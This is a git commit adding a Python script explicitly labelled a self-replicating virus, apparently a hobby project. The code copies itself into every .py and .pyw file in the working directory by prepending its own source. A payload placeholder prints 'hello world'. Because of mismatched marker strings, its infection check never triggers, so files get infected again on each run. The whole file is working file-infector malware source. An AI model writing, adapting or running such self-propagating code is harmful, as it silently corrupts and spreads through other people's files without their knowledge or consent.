701ff7797273b77830bd5b30ca721422d41d1233
Madan Raj <53041080+Mr-Maximus@users.noreply.github.com>
2020-11-25 15:45:32 +0530

    Create self_replicating_virus1.py

---
+++ python projects/self_replicating_virus1.py
@@ -0,0 +1,44 @@
+###start of virus###
+
+import sys,glob
+
+code=[]
+with open(sys.argv[0],'r') as f:
+    lines=f.readlines()
+
+virus_area=False
+for line in lines:
+    if line== '###start of virus###\n':
+        virus_area=True
+    if virus_area:
+        code.append(line)
+    if line=='###END OF VIRUS###\n':
+        break
+
+python_script=glob.glob('*.py')+ glob.glob('*.pyw')   
+print(python_script)
+
+for script in python_script:
+    with open(script,'r') as f:
+        script_code=f.readlines()
+
+    infected=False
+    for line in script_code:
+        if line=='###start of virus##\n':
+            infected=True
+            break
+
+    if not infected:
+        final_code=[]
+        final_code.extend(code)
+        final_code.extend('\n')
+        final_code.extend(script_code)
+
+        with open(script,'w') as f:
+            f.writelines(final_code)
+
+#malicious piece of code(payload)
+print('hello world')
+
+
+#END OF VIRUS###    
